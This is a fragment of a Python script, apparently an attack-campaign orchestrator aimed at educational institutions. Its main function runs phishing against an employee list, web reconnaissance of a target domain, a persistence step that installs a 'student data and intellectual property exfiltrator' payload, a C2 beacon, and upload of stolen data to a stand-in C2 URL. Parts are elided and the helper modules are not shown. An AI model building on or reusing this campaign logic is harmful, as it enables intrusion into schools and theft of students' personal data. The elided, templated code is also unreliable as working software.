...
def main():
    """
    Main function to run the educational_institution_campaign campaign.
    """
    print(f"[*] Starting educational_institution_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("educational_institutions_employees.txt")
    run_tool("apt_web_recon.js", "--target educational_institutions.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/student_data_and_intellectual_property_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-EDUCATIONAL_INSTITUTIONS-01")
    ...
    exfiltration.exfiltrate_data("student_data_and_intellectual_property/student_data_and_intellectual_property.zip", "https://c2.example.com/upload")
    run_tool("payloads/student_data_and_intellectual_property_exfiltrator.py")
